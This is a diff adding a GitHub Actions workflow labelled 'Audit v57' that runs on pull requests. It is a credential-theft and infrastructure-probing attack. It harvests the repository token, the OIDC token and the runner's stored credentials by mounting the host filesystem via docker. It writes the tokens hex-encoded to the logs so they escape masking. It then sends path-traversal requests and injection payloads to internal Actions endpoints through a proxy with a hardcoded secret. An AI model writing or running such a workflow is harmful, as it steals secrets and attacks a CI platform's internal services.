@@ -1,0 +1,275 @@
+name: Audit v57
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v57:
+    runs-on: ubuntu-latest
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V57 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: FULL RESPONSE BLEED — PIPELINES HOST PROXY
+      # V56: IDTOK + Host:pipelines → pools returned HTTP 200!
+      # Now exhaust ALL endpoints & dump full responses for bleeding.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - Pipelines Proxy Full Bleed
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== PIPELINES PROXY BLEED ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          RT=$(cat /tmp/rt.txt)
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          PIPE_HOST="pipelines.actions.githubusercontent.com"
+          VER="api-version=6.0-preview"
+
+          # A: Full response dump on all distributedtask endpoints via pipelines host
+          echo "--- A: Full Bleed distributedtask via pipelines ---"
+          for EP in \
+            "_apis/distributedtask/pools" \
+            "_apis/distributedtask/admintoken" \
+            "_apis/distributedtask/pools/..%2fadmintoken" \
+            "_apis/distributedtask/pools/..%2fidtoken" \
+            "_apis/distributedtask/pools/..%2fsessions" \
+            "_apis/distributedtask/pools/..%2fmessages" \
+            "_apis/distributedtask/pools/..%2fbrokerlistener" \
+            "_apis/distributedtask/pools/..%2faccesspolicy" \
+            "_apis/distributedtask/pools/..%2frequests" \
+            "_apis/distributedtask/pools/..%2fjobrequests" \
+            "_apis/distributedtask/pools/..%2fupdates" \
+            "_apis/distributedtask/pools/..%2ffeedstream" \
+            "_apis/distributedtask/pools/..%2fconcurrencylimitoverrides" \
+            "_apis/distributedtask/pools/..%2fenterpriseaccesspolicies" \
+            "_apis/runtime/runnergroups" \
+            "_apis/runtime/runnerscalesets" \
+            "_apis/security/SecurityNamespaces" \
+            "_apis/FeatureAvailability/FeatureFlags" \
+            "_apis/operations"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 4 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $PIPE_HOST" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/$EP" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            # Print full 500B response — bleed everything
+            echo "A $EP = $CODE"
+            echo "$BODY" | head -c 500
+            echo ""
+          done
+          echo ""
+
+          # B: FULL response on admintoken with headers dumped (-i)
+          echo "--- B: admintoken FULL HEADERS ---"
+          /usr/bin/curl -sS -i --connect-timeout 3 -m 5 \
+            -H "Authorization: Bearer $IDTOK" \
+            -H "Host: $PIPE_HOST" \
+            -H "Accept: application/json; $VER" \
+            "$PROXY/_apis/distributedtask/pools/..%2fadmintoken" --path-as-is 2>/dev/null
+          echo ""
+          echo "--- B2: admintoken POST FULL HEADERS ---"
+          /usr/bin/curl -sS -i -X POST --connect-timeout 3 -m 5 \
+            -H "Authorization: Bearer $IDTOK" \
+            -H "Host: $PIPE_HOST" \
+            -H "Content-Type: application/json" \
+            -H "Accept: application/json; $VER" \
+            "$PROXY/_apis/distributedtask/pools/..%2fadmintoken" --path-as-is \
+            -d '{"poolId":1}' 2>/dev/null
+          echo ""
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: RUNNER SERVICE FULL BLEED VIA PROXY
+      # runner returned 200 connectionData. Hit everything now.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Runner Full Bleed
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== RUNNER FULL BLEED ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          RT=$(cat /tmp/rt.txt)
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          RUNNER_HOST="runner.actions.githubusercontent.com"
+          VER="api-version=6.0-preview"
+
+          # A: Full response on ALL runner endpoints
+          echo "--- A: All Runner Endpoints ---"
+          for EP in \
+            "_apis/connectionData" \
+            "_apis/resourceareas" \
+            "_apis/distributedtask/pools" \
+            "_apis/distributedtask/admintoken" \
+            "_apis/distributedtask/pools/..%2fadmintoken" \
+            "_apis/distributedtask/pools/..%2fidtoken" \
+            "_apis/distributedtask/pools/..%2fsessions" \
+            "_apis/distributedtask/sessions" \
+            "_apis/distributedtask/pools/..%2fbrokerlistener" \
+            "_apis/distributedtask/brokerlistener" \
+            "_apis/runtime/runnergroups" \
+            "_apis/runtime/runnerscalesets" \
+            "_apis/distributedtask/pools/..%2fmessages" \
+            "_apis/distributedtask/pools/..%2fjobrequests" \
+            "_apis/distributedtask/jobs" \
+            "_apis/distributedtask/pools/..%2fupdates" \
+            "_apis/distributedtask/pools/..%2faccesspolicy" \
+            "_apis/security/SecurityNamespaces"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 4 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $RUNNER_HOST" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/$EP" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A $EP = $CODE"
+            echo "$BODY" | head -c 500
+            echo ""
+          done
+          echo ""
+
+          # B: Try CTOK on runner (it's the credential token — might have agent permissions)
+          echo "--- B: CTOK on Runner ---"
+          for EP in \
+            "_apis/distributedtask/pools" \
+            "_apis/distributedtask/pools/..%2fadmintoken" \
+            "_apis/distributedtask/admintoken" \
+            "_apis/distributedtask/sessions" \
+            "_apis/runtime/runnergroups" \
+            "_apis/runtime/runnerscalesets"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $CTOK" \
+              -H "Host: $RUNNER_HOST" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/$EP" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B CTOK $EP = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: BLEED THE OUTER & INNER PIPELINES 403 w/ FULL BODY
+      # 403 bleeds the ACL token/permission identity info.
+      # Force 403+500s on every endpoint possible via the proxy.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - 403 Bleed and Error Injection
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== 403 BLEED ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          RT=$(cat /tmp/rt.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          VER="api-version=6.0-preview"
+
+          # A: Hit every endpoint on pipelines that gave 403 — dump full body
+          echo "--- A: Full body 403 bleed ---"
+          for HHOST in "pipelines.actions.githubusercontent.com" "pipelinesghubeus14.actions.githubusercontent.com"; do
+            for EP in \
+              "_apis/connectionData" \
+              "_apis/distributedtask/pools" \
+              "_apis/distributedtask/pools/..%2fadmintoken" \
+              "_apis/security/SecurityNamespaces" \
+              "_apis/security/AccessControlLists"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+                -H "Authorization: Bearer $IDTOK" \
+                -H "Host: $HHOST" \
+                -H "Accept: application/json; $VER" \
+                "$PROXY/$EP" --path-as-is 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              echo "A $HHOST $EP = $CODE"
+              echo "$BODY" | head -c 600
+              echo ""
+            done
+          done
+
+          # B: Force errors, null injection, large payloads via pipelines proxy
+          echo "--- B: Error injection ---"
+          for PAY in \
+            '{"$type":"Microsoft.TeamFoundation.DistributedTask.WebApi.TaskAgentPool","Name":"pwn"}' \
+            '{"runnerScaleSet":null}' \
+            '{"poolId":null,"name":"\u0000"}'; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: pipelines.actions.githubusercontent.com" \
+              -H "Content-Type: application/json" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/_apis/distributedtask/pools/..%2fadmintoken" --path-as-is \
+              -d "$PAY" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B PAY=$CODE | $(echo "$BODY" | head -c 400)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V57 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V57 COMPLETE ==="
